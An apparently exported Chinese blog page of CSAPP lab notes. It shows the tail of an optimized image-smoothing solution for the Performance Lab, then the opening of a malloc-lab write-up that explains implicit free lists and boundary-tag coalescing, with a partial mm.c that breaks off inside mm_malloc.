        temp_pixel_group[q1 % 3].green = src[RIDX(0, q1, dim)].green + src[RIDX(1, q1, dim)].green;
        temp_pixel_group[q1 % 3].red = src[RIDX(0, q1, dim)].red + src[RIDX(1, q1, dim)].red;
        dst[RIDX(0, j, dim)].blue = (temp_pixel_group[0].blue + temp_pixel_group[1].blue + temp_pixel_group[2].blue) / 6;
        dst[RIDX(0, j, dim)].red = (temp_pixel_group[0].red + temp_pixel_group[1].red + temp_pixel_group[2].red) / 6;
        dst[RIDX(0, j, dim)].green = (temp_pixel_group[0].green + temp_pixel_group[1].green + temp_pixel_group[2].green) / 6;
    }

    // 下边处理
    // 初始化temp_pixel_group
    for (i = 0; i &lt;= 1; i++)
    {
        temp_pixel_group[i].blue = src[RIDX(dim - 1, i, dim)].blue + src[RIDX(dim - 2, i, dim)].blue;
        temp_pixel_group[i].green = src[RIDX(dim - 1, i, dim)].green + src[RIDX(dim - 2, i, dim)].green;
        temp_pixel_group[i].red = src[RIDX(dim - 1, i, dim)].red + src[RIDX(dim - 2, i, dim)].red;
    }
    for (j = 1; j &lt;= dim - 2; j++)
    {
        q1 = j + 1;
        // q2 = q1 + dim;
        temp_pixel_group[q1 % 3].blue = src[RIDX(dim - 1, q1, dim)].blue + src[RIDX(dim - 2, q1, dim)].blue;
        temp_pixel_group[q1 % 3].green = src[RIDX(dim - 1, q1, dim)].green + src[RIDX(dim - 2, q1, dim)].green;
        temp_pixel_group[q1 % 3].red = src[RIDX(dim - 1, q1, dim)].red + src[RIDX(dim - 2, q1, dim)].red;
        dst[RIDX(dim - 1, j, dim)].blue = (temp_pixel_group[0].blue + temp_pixel_group[1].blue + temp_pixel_group[2].blue) / 6;
        dst[RIDX(dim - 1, j, dim)].red = (temp_pixel_group[0].red + temp_pixel_group[1].red + temp_pixel_group[2].red) / 6;
        dst[RIDX(dim - 1, j, dim)].green = (temp_pixel_group[0].green + temp_pixel_group[1].green + temp_pixel_group[2].green) / 6;
    }

    // 左边处理
    // 初始化temp_pixel_group
    for (i = 0; i &lt;= 1; i++)
    {
	    
        temp_pixel_group[i].blue = src[RIDX(i, 0, dim)].blue + src[RIDX(i, 1, dim)].blue;
        temp_pixel_group[i].green = src[RIDX(i, 0, dim)].green + src[RIDX(i, 1, dim)].green;
        temp_pixel_group[i].red = src[RIDX(i, 0, dim)].red + src[RIDX(i, 1, dim)].red;
    }
    for (i = 1; i &lt;= dim - 2; i++)
    {
        q1 = i + 1;
        // q2 = q1 + dim;
        temp_pixel_group[q1 % 3].blue = src[RIDX(q1, 0, dim)].blue + src[RIDX(q1, 1, dim)].blue;
        temp_pixel_group[q1 % 3].green = src[RIDX(q1, 0, dim)].green + src[RIDX(q1, 1, dim)].green;
        temp_pixel_group[q1 % 3].red = src[RIDX(q1, 0, dim)].red + src[RIDX(q1, 1, dim)].red;
        dst[RIDX(i, 0, dim)].blue = (temp_pixel_group[0].blue + temp_pixel_group[1].blue + temp_pixel_group[2].blue) / 6;
        dst[RIDX(i, 0, dim)].red = (temp_pixel_group[0].red + temp_pixel_group[1].red + temp_pixel_group[2].red) / 6;
        dst[RIDX(i, 0, dim)].green = (temp_pixel_group[0].green + temp_pixel_group[1].green + temp_pixel_group[2].green) / 6;
    }

    // 右边处理
    // 初始化temp_pixel_group
    for (i = 0; i &lt;= 1; i++)
    {
        temp_pixel_group[i].blue = src[RIDX(i, dim - 1, dim)].blue + src[RIDX(i, dim - 2, dim)].blue;
        temp_pixel_group[i].green = src[RIDX(i, dim - 1, dim)].green + src[RIDX(i, dim - 2, dim)].green;
        temp_pixel_group[i].red = src[RIDX(i, dim - 1, dim)].red + src[RIDX(i, dim - 2, dim)].red;
    }
    for (i = 1; i &lt;= dim - 2; i++)
    {
        q1 = i + 1;
        temp_pixel_group[q1 % 3].blue = src[RIDX(q1, dim - 1, dim)].blue + src[RIDX(q1, dim - 2, dim)].blue;
        temp_pixel_group[q1 % 3].green = src[RIDX(q1, dim - 1, dim)].green + src[RIDX(q1, dim - 2, dim)].green;
        temp_pixel_group[q1 % 3].red = src[RIDX(q1, dim - 1, dim)].red + src[RIDX(q1, dim - 2, dim)].red;
        dst[RIDX(i, dim - 1, dim)].blue = (temp_pixel_group[0].blue + temp_pixel_group[1].blue + temp_pixel_group[2].blue) / 6;
        dst[RIDX(i, dim - 1, dim)].red = (temp_pixel_group[0].red + temp_pixel_group[1].red + temp_pixel_group[2].red) / 6;
        dst[RIDX(i, dim - 1, dim)].green = (temp_pixel_group[0].green + temp_pixel_group[1].green + temp_pixel_group[2].green) / 6;
    }

    // 中间通用
    int k;
    for (i = 1; i &lt;= dim - 2; i++)
    {
        // 换行初始化
        for (k = 0; k &lt;= 2; k++)
        {
            temp_pixel_group[k].blue = src[RIDX(i-1, k, dim)].blue + src[RIDX(i, k, dim)].blue + src[RIDX(i+1, k, dim)].blue;
            temp_pixel_group[k].green = src[RIDX(i-1, k, dim)].green + src[RIDX(i, k, dim)].green + src[RIDX(i+1, k, dim)].green;
            temp_pixel_group[k].red = src[RIDX(i-1, k, dim)].red + src[RIDX(i, k, dim)].red + src[RIDX(i+1, k, dim)].red;
        }
        for (j = 1; j &lt;= dim - 2; j++)
        {
            q1 = j+1;
            temp_pixel_group[q1 % 3].blue = src[RIDX(i-1, j+1, dim)].blue + src[RIDX(i, j+1, dim)].blue+ src[RIDX(i+1, j+1, dim)].blue;
            temp_pixel_group[q1 % 3].green = src[RIDX(i-1, j+1, dim)].green + src[RIDX(i, j+1, dim)].green+ src[RIDX(i+1, j+1, dim)].green;
            temp_pixel_group[q1 % 3].red = src[RIDX(i-1, j+1, dim)].red + src[RIDX(i, j+1, dim)].red+ src[RIDX(i+1, j+1, dim)].red;
            dst[RIDX(i, j, dim)].blue = (temp_pixel_group[0].blue + temp_pixel_group[1].blue + temp_pixel_group[2].blue) / 9;
            dst[RIDX(i, j, dim)].red = (temp_pixel_group[0].red + temp_pixel_group[1].red + temp_pixel_group[2].red) / 9;
            dst[RIDX(i, j, dim)].green = (temp_pixel_group[0].green + temp_pixel_group[1].green + temp_pixel_group[2].green) / 9;
        }
    }
}
</code></pre>
<p>后续可进行的优化就交给大家了：分块求平均。我眼睛花了。</p>
<h1>本文参考</h1>
<ul>
<li><a href="https://bbs.huaweicloud.com/blogs/343018">《深入理解计算机系统》（CSAPP）实验五 —— Perfom Lab-云社区-华为云 (huaweicloud.com)</a></li>
<li><a href="https://blog.csdn.net/mdzzname/article/details/111999693">CSAPP Lab4: Performance Lab_csapp实验四perflab-CSDN博客</a></li>
<li><a href="https://www.cnblogs.com/ustca/p/11790314.html">CSAPP：代码优化【矩阵读写】 - 东寻 - 博客园 (cnblogs.com)</a></li>
<li><a href="https://blog.csdn.net/qq_41140987/article/details/105329531">CSAPP：PerfLab实验_csapp perflab-CSDN博客</a></li>
<li><a href="https://www.cnblogs.com/kangyupl/p/13258095.html">【CSAPP】Performance Lab 实验笔记 - 康宇PL - 博客园 (cnblogs.com)</a></li>
<li><a href="https://xymeow.github.io/post/csapp-lab4/">CSAPP LAB4：perflab-优化两个奇怪的函数 - 中鸽院专家楼 (xymeow.github.io)</a></li>
<li><a href="https://blog.csdn.net/u010420283/article/details/134741705">编译代码性能优化实践：理解循环展开(pragma unroll)_#pragma unroll-CSDN博客</a></li>
<li><a href="https://baike.baidu.com/item/%E5%BE%AA%E7%8E%AF%E5%B1%95%E5%BC%80/6322872">循环展开_百度百科 (baidu.com)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/596619805">Csapp Lab5: perflab - 知乎 (zhihu.com)</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">4</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="1051831239">
                            <a href="#1051831239">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-5 手写动态存储分配器</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link ">CSAPP LAB-1 位操作</a></li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link ">CSAPP LAB-2 二进制炸弹实验</a></li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link ">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li>CSAPP LAB-4 代码优化（本文）</li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link highlight">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1735947091">
                            <a href="#1735947091">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-3 缓冲区溢出炸弹</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link ">CSAPP LAB-1 位操作</a></li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link ">CSAPP LAB-2 二进制炸弹实验</a></li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link highlight">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li>CSAPP LAB-4 代码优化（本文）</li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link ">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3315008132">
                            <a href="#3315008132">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-1 位操作</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link highlight">CSAPP LAB-1 位操作</a></li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link ">CSAPP LAB-2 二进制炸弹实验</a></li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link ">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li>CSAPP LAB-4 代码优化（本文）</li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link ">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3522416439">
                            <a href="#3522416439">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-2 二进制炸弹实验</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link ">CSAPP LAB-1 位操作</a></li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link highlight">CSAPP LAB-2 二进制炸弹实验</a></li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link ">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li>CSAPP LAB-4 代码优化（本文）</li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link ">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">4</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="3315008132">
                            <a href="#3315008132">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-1 位操作</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li>CSAPP LAB-1 位操作（本文）</li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link ">CSAPP LAB-2 二进制炸弹实验</a></li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link ">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link highlight">CSAPP LAB-4 代码优化</a></li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link ">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3522416439">
                            <a href="#3522416439">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-2 二进制炸弹实验</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link ">CSAPP LAB-1 位操作</a></li>
<li>CSAPP LAB-2 二进制炸弹实验（本文）</li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link ">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link highlight">CSAPP LAB-4 代码优化</a></li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link ">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1735947091">
                            <a href="#1735947091">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-3 缓冲区溢出炸弹</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link ">CSAPP LAB-1 位操作</a></li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link ">CSAPP LAB-2 二进制炸弹实验</a></li>
<li>CSAPP LAB-3 缓冲区溢出炸弹（本文）</li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link highlight">CSAPP LAB-4 代码优化</a></li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link ">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1051831239">
                            <a href="#1051831239">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-5 手写动态存储分配器</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link ">CSAPP LAB-1 位操作</a></li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link ">CSAPP LAB-2 二进制炸弹实验</a></li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link ">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link highlight">CSAPP LAB-4 代码优化</a></li>
<li>CSAPP LAB-5 手写动态存储分配器（本文）</li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="1051831239" class="record">
            <header>
                <h1 class="record-title">CSAPP LAB-5 手写动态存储分配器</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('CSAPP');">CSAPP</button>
                    
                    <button class="btn" onclick="activeTag('C');">C</button>
                    
                    <button class="btn" onclick="activeTag('malloc');">malloc</button>
                    
                    <button class="btn" onclick="activeTag('内存分配');">内存分配</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>6/13/2024</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240617204205.webp</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>3eb1abc7</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>课本案例实践</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p>我也大概察觉到我们课程的实验是挑着 CSAPP 中原版实验去做的，并进行了简化，所以和网上的实验顺序不太一样，但内容是大致相同的。</p>
<blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link ">CSAPP LAB-1 位操作</a></li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link ">CSAPP LAB-2 二进制炸弹实验</a></li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link ">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link ">CSAPP LAB-4 代码优化</a></li>
<li>CSAPP LAB-5 手写动态存储分配器（本文）</li>
</ul>
</blockquote>
<p>这次的实验<strong>建议先看课本的第九章的 9.9 部分</strong>（《CSAPP》第三版），理解其中的内容后进行实现。而且大部分代码课本上都有。不管你现在《CSAPP》学到哪一个部分，都可以直接看 9.9 章，不用担心没有铺垫内容。</p>
<p>本文将介绍一个动态存储分配器的简单实现：隐式空闲链表 + 立即边界标记合并方式 + 首次匹配/下次匹配算法。更高级的实现可以看文末参考文章。</p>
<blockquote>
<p>这是我 CSAPP 课程的最后一个实验了，每次专挑👩助教验收，温柔贴心给分高😍！</p>
</blockquote>
<h1>实验介绍和要求</h1>
<p>本实验需要用 c 语言实现一个动态的存储分配器，也就是你自己版本的 <code>malloc</code>，<code>free</code>，<code>realloc</code> 函数。</p>
<p>解压文件：</p>
<pre><code class="language-sh">tar xvf malloclab-handout.tar
</code></pre>
<p>我们需要修改的唯一文件是 <code>mm.c</code>，包含如下几个需要实现的函数：</p>
<pre><code class="language-c">/*
mm_init:在调用mm_malloc，mm_realloc或mm_free之前，调用mm_init进行初始化，正确返回0。
*/
int mm_init(void); 

/*
mm_malloc：在堆区域分配指定大小的块，分配的空间，返回的指针应该是8字节对齐的
*/
void *mm_malloc(size_t size); 

/*
mm_free:释放指针指向的block
*/
void mm_free(void *ptr); 

/*
返回指向一个大小为size的区域指针，满足一下条件：
* if ptr is NULL, the call is equivalent to mm_malloc(size); 
* if size is equal to zero, the call is equivalent to mm_free(ptr); 
* if ptr is not NULL：先按照size指定的大小分配空间，将原有数据从头到尾拷贝到新分配的内存区域，而后释放原来ptr所指内存区域
*/
void *mm_realloc(void *ptr, size_t size);
</code></pre>
<p>记住哦，本次实验的任务要求之一是指针是 8 字节对齐的。</p>
<p>我们可以调用实验提供给我们的函数，这些函数定义在 <code>memory.c</code> 中：</p>
<ul>
<li><code>void *mem_sbrk(int incr)</code>: Expands the heap by incr bytes, where incr is a positive non-zero integer and returns a generic pointer to the first byte of the newly allocated heap area.</li>
<li><code>void *mem_heap_lo(void)</code>: Returns a generic pointer to the first byte in the heap.</li>
<li><code>void *mem_heap_hi(void)</code>: Returns a generic pointer to the last byte in the heap.</li>
<li><code>size_t mem_heapsize(void)</code>: Returns the current size of the heap in bytes.</li>
<li><code>size_t mem_pagesize(void)</code>: Returns the system’s page size in bytes (4K onLinux systems).</li>
</ul>
<p>在这篇文章的实现方式中，只需要使用 <code>void *mem_sbrk(int incr)</code>，与标准实现不同的是，这个函数拒绝收缩堆的请求，也就是不能输入负数。<code>mem_sbrk</code> 的作用可以结合课本 9.9 章进行理解。</p>
<p>验证我们的动态的存储分配器：</p>
<ul>
<li><code>mdriver.c</code>：负责测试 <code>mm.c</code> 的正确性,空间利用率和吞吐量</li>
<li>执行 <code>make</code> 指令生成 <code>mdriver</code> 可执行文件</li>
<li><code>mdriver</code> 的使用：
<ul>
<li><code>-f &lt;tracefile&gt;</code>:  <code>-f</code> 后添加一些 trace file 来测试我们实现的函数</li>
<li><code>-V</code>: 打印出诊断信息。</li>
<li>例如：<code>./mdriver -V  -f short1-bal.rep</code></li>
</ul>
</li>
</ul>
<p>一些编程规则：</p>
<ul>
<li>不能改变 <code>mm.c</code> 中函数接口</li>
<li>不能直接调用任何内存管理的库函数和系统函数 <code>malloc</code>, <code>calloc</code>, <code>free</code>, <code>realloc</code>, <code>sbrk</code>, <code>brk</code></li>
<li>不能定义任何全局或者静态复合数据结构如 <code>arrays</code>, <code>structs</code>, <code>trees</code>，允许使用 <code>integers</code>, <code>floats</code> 以及 <code>pointers</code> 等简单数据类型</li>
<li>返回的指针需要 8 字节对齐</li>
</ul>
<h1>关键概念</h1>
<p>我把课本涉及到的关键概念模型简要介绍一下。</p>
<p>本文介绍的是隐式空闲链表 + 立即边界标记合并方式 + 首次匹配/下次匹配算法。</p>
<p>更多详细内容理解就看下一节的代码注释咯！</p>
<h2>隐式空闲链表的恒定形式</h2>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240617202828.webp" alt="image.png"></p>
<p>一个正方形表示 4 字节（一个字），虚线表示双字对齐标志。正方形中的头部尾部标记为 <code>size/is_alloc</code>。</p>
<h2>标记边界合并</h2>
<p>Knuth 提出了边界标记技术，允许在常数时间内进行对前面的块的合并。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240617001201.webp" alt="image.png"></p>
<p>这种思想，是在每个块的结尾处添加一个脚部（footer，边界标记），其中脚部就是头部的一个副本。如果每个块包括这样一个脚部，那么分配器就可以通过检查它的脚部，判断前面一个块的起始位置和状态，这个脚部总是在距当前块开始位置一个字的距离。</p>
<p>考虑当分配器释放当前块时所有可能存在的情况：</p>
<ol>
<li>前面的块和后面的块都是已分配的。</li>
<li>前面的块是已分配的，后面的块是空闲的。</li>
<li>前面的块是空闲的，而后面的块是已分配的。</li>
<li>前面的和后面的块都是空闲的。</li>
</ol>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240617001349.webp" alt="image.png"></p>
<h2>匹配算法</h2>
<p>匹配算法：</p>
<ul>
<li>首次匹配（First Fit）。从头开始搜索空闲链表，选择第一个合适的空闲块。
<ul>
<li>优点：趋向于将大的空闲块保留在链表的后面。</li>
<li>缺点：它趋向于在靠近链表起始处留下小空闲块的「碎片」，增大了对较大块的搜索时间。</li>
</ul>
</li>
<li>下一次适配（Next Fit）。和首次适配很相似，只不过不是从链表的起始处开始每次搜索，而是从上一次查询结束的地方开始。由 Donald Knuth 提出。基于思想：如果上一次在某个空闲块里发现了一个匹配，那么很可能下一次我们也能在这个剩余块中发现匹配。
<ul>
<li>优点：比首次适配运行起来明显快一些。</li>
<li>缺点：内存利用率比首次匹配低。</li>
</ul>
</li>
<li>最佳适配（Best Fit）。最佳适配检查每个空闲块，选择适合所需请求大小的最小空闲块。
<ul>
<li>优点：内存利用率较高。</li>
<li>缺点：在简单空闲链表组织结构中（比如上面提到的隐式空闲链表），需要对堆进行彻底搜索。</li>
</ul>
</li>
</ul>
<h1><code>mm.c</code> 文件</h1>
<pre><code class="language-c">/*
 * mm-naive.c - The fastest, least memory-efficient malloc package.
 *
 * In this naive approach, a block is allocated by simply incrementing
 * the brk pointer.  A block is pure payload. There are no headers or
 * footers.  Blocks are never coalesced or reused. Realloc is
 * implemented directly using mm_malloc and mm_free.
 *
 * NOTE TO STUDENTS: Replace this header comment with your own header
 * comment that gives a high level description of your solution.
 */
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;assert.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;

#include &quot;mm.h&quot;
#include &quot;memlib.h&quot;

/*********************************************************
 * NOTE TO STUDENTS: Before you do anything else, please
 * provide your team information in the following struct.
 ********************************************************/
team_t team = {
    /* Team name */
    &quot;SA23xxxxxx&quot;,
    /* First member's full name */
    &quot;uuanqin&quot;,
    /* First member's email address */
    &quot;uuanqin@uuanqin.top&quot;,
    /* Second member's full name (leave blank if none) */
    &quot;&quot;,
    /* Second member's email address (leave blank if none) */
    &quot;&quot;};

/*********  一些必要的宏 ***************/

/* single word (4) or double word (8) alignment */
#define ALIGNMENT 8

/* rounds up to the nearest multiple of ALIGNMENT */
#define ALIGN(size) (((size) + (ALIGNMENT - 1)) &amp; ~0x7)

#define SIZE_T_SIZE (ALIGN(sizeof(size_t)))


// 基本常量
#define WSIZE 4       // 字的大小（头部、脚部大小）
#define DSIZE 8       // 双字大小
#define CHUNKSIZE (1 &lt;&lt; 12)  // 每次扩展堆时使用这个大小


#define MAX(x, y) ((x) &gt; (y) ? (x) : (y))

#define PACK(size, is_alloc) ((size) | (is_alloc))   // 将大小和分配位打包组装

// 读取/写入 指定位置的值
#define GET(p) (*(unsigned int *)(p))                
#define PUT(p, val) (*(unsigned int *)(p) = (val))

// 获取头部的信息
#define GET_SIZE(p) (GET(p) &amp; ~0x7)
#define GET_ALLOC(p) (GET(p) &amp; 0x1)

// 给定块的指针bp，获取其头部和脚部的指针（注意，bp指向有效载荷的第一个字节）
#define HDRP(bp) ((char *)(bp) - WSIZE)
#define FTRP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE) // 依赖与头部已分配好大小

// 给定块的指针bp，计算前后块的指针（注意，bp指向有效载荷的第一个字节）
#define NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(((char *)(bp) - WSIZE)))
#define PREV_BLKP(bp) ((char *)(bp) - GET_SIZE(((char *)(bp) - DSIZE)))

// 堆的起始位置
static void *heap_listp; // 总是指向序言块，我们可以小小优化为指向下一个块

// 函数注册
static void *coalesce(void *bp);
static void *extend_heap(size_t words);
static void *find_fit(size_t asize);
static void place(void *bp,size_t asize);

// 是否启动下次适配
#define NEXT_FIT

static void *algo_first_fit(size_t asize);

#ifdef NEXT_FIT
    static void *algo_next_fit(size_t asize);
#endif


/*
 * mm_init - initialize the malloc package.
 */
int mm_init(void)
{
    // 创建一个空的空闲链表
    if ((heap_listp = mem_sbrk(4 * WSIZE)) == (void *)-1)
    {
        return -1;
    }
    // 因为序言块+结尾块只需要三个字节。我们又必须保证堆的开始位置是双字对齐的。
    // PUT(heap_listp, 0);  // 课本中加了这一条，主要是为了占位，没有什么含义。
    PUT(heap_listp + (1 * WSIZE), PACK(DSIZE, 1)); // 序言块头部
    PUT(heap_listp + (2 * WSIZE), PACK(DSIZE, 1)); // 序言块脚部
    PUT(heap_listp + (3 * WSIZE), PACK(0, 1));     // 结尾块头部
    heap_listp += (2 * WSIZE);                     // 移动堆指针到序言块中间

    // 使用空闲块扩展堆
    if (extend_heap(CHUNKSIZE / WSIZE) == NULL)
    {
        return -1;
    }

    return 0;
}

static void *extend_heap(size_t words)
{
    char *bp;
    size_t size;
    size = (words % 2) ? (words + 1) * WSIZE : words * WSIZE; // 保证size是奇数个字节，因为有一个字节用来放空闲块的头部
    if ((long)(bp = mem_sbrk(size)) == -1)
    {
        return NULL;
    }
    PUT(HDRP(bp), PACK(size, 0));           // 空闲块的头部
    PUT(FTRP(bp), PACK(size, 0));           // 空闲块的尾部
    PUT(HDRP(NEXT_BLKP(bp)), PACK(0, 1));  // 新的结尾块

    return coalesce(bp); // 合并块
}

/*
 * mm_free - Freeing a block does nothing.
 */
void mm_free(void *ptr)
{
    size_t size = GET_SIZE(HDRP(ptr));
    // 对当前块的标记位进行改变
    PUT(HDRP(ptr), PACK(size, 0));
    PUT(FTRP(ptr), PACK(size, 0));
    coalesce(ptr);
}

// 合并块
static void *coalesce(void *bp)
{
    size_t prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp)));  // 检查块前面是否被分配
    size_t next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));  // 检查块后面是否被分配
    size_t size = GET_SIZE(HDRP(bp));
    // 因为序言块和结尾块的设计，使得边界情况的检查变得简单
    if (prev_alloc &amp;&amp; next_alloc)
    {
        return bp;
    }
    else if (prev_alloc &amp;&amp; !next_alloc)
    {
        size += GET_SIZE(HDRP(NEXT_BLKP(bp)));
        PUT(HDRP(bp), PACK(size, 0));
        PUT(FTRP(bp), PACK(size, 0));
    }
    else if (!prev_alloc &amp;&amp; next_alloc)
    {
        size += GET_SIZE(HDRP(PREV_BLKP(bp)));
        PUT(FTRP(bp), PACK(size, 0));
        PUT(HDRP(PREV_BLKP(bp)), PACK(size, 0));
        bp = PREV_BLKP(bp);
    }
    else
    {
        size += GET_SIZE(HDRP(PREV_BLKP(bp))) + GET_SIZE(FTRP(NEXT_BLKP(bp)));
        PUT(HDRP(PREV_BLKP(bp)), PACK(size, 0));
        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, 0));
        bp = PREV_BLKP(bp);
    }
    return bp;
}



/*
 * mm_malloc - Allocate a block by incrementing the brk pointer.
 *     Always allocate a block whose size is a multiple of the alignment.
 */
void *mm_malloc(size_t size)
{
    size_t asize; // 预留了头部和脚部的大小
    size_t extend_size;
    char *bp;
    if (size &lt;= 0)
        return NULL;

